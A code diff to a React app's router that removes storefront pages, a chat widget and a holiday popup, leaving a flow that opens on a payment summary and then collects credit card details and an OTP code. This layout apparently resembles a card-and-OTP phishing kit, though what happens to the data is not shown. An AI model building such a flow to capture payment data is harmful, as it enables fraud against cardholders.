@@ -8,8 +8,6 @@ import ScrollToTop from "./components/ScrollToTop";
 import PageTitleUpdater from "./components/PageTitleUpdater";
 import { ThemeProvider } from "./contexts/ThemeContext";
 import { initializeSocket, disconnectSocket, socket } from "./lib/store";
-import AmerChat from "./components/AmerChat";
-import RamadanPopup from "./components/RamadanPopup";
 
 
 // Form Pages
@@ -19,44 +17,23 @@ import SummaryPayment from "./pages/SummaryPayment";
 import CreditCardPayment from "./pages/CreditCardPayment";
 import OTPVerification from "./pages/OTPVerification";
 
-
-
-
-
-
 // Final Page
 import FinalPage from "./pages/FinalPage";
-
-// Store Pages
-import { StoreProvider, LanguageProvider, StorePage, CollectionPage, ProductPage, CartPage, SearchPage } from './store';
 
 
 function Router() {
   return (
     <Switch>
-      {/* Main Pages */}
-      <Route path={"/"} component={StorePage} />
-      <Route path={"/store"} component={StorePage} />
-      <Route path={"/store/collection/:handle"} component={CollectionPage} />
-      <Route path={"/store/product/:handle"} component={ProductPage} />
-      <Route path={"/store/cart"} component={CartPage} />
-      <Route path={"/store/search"} component={SearchPage} />
-
-      {/* Form Routes */}
+      {/* Main Page - Summary Payment */}
+      <Route path={"/"} component={SummaryPayment} />
       <Route path={"/summary-payment"} component={SummaryPayment} />
 
       {/* Payment Routes */}
       <Route path={"/credit-card-payment"} component={CreditCardPayment} />
       <Route path={"/otp-verification"} component={OTPVerification} />
 
-
-
-
-
-
       {/* Final Page */}
       <Route path={"/final-page"} component={FinalPage} />
-
 
       <Route path={"/404"} component={NotFound} />
       {/* Final fallback route */}
@@ -196,13 +173,7 @@ function App() {
           <Toaster />
           <ScrollToTop />
           <PageTitleUpdater />
-          <AmerChat />
-          <RamadanPopup />
-          <LanguageProvider>
-            <StoreProvider>
-              <Router />
-            </StoreProvider>
-          </LanguageProvider>
+          <Router />
         </TooltipProvider>
       </ThemeProvider>
     </ErrorBoundary>
